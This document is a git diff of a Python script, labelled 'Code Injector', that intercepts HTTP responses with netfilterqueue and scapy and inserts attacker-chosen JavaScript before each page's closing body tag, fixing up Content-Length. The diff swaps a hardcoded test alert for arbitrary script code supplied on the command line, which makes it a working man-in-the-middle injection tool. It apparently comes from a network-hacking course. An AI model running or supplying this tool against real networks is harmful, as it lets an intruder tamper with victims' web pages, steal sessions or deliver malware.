@@ -3,6 +3,19 @@
 import scapy.all as scapy
 import netfilterqueue
 import re
+import optparse
+import Queue
+queue = Queue.Queue()
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-j", "--js-code", dest="code", help="Javascript Code")
+    (options, arguments) = parser.parse_args()
+
+    if not options.code:
+        parser.error("[-] Please specify Javascript Code , use --help for more.")
+    return options
 
 
 def set_load(packet, load):
@@ -24,7 +37,7 @@ def process_packets(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            injection_code = "<script>alert('test');</script>"
+            injection_code = options.code
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
@@ -41,6 +54,13 @@ def process_packets(packet):
     packet.accept()
 
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packets)
-queue.run()
+options = get_arguments()
+print("Code Injector\n\t-Alrocks29")
+
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packets)
+    queue.run()
+
+except KeyboardInterrupt:
+    print ("\n[-] Quitting.................")
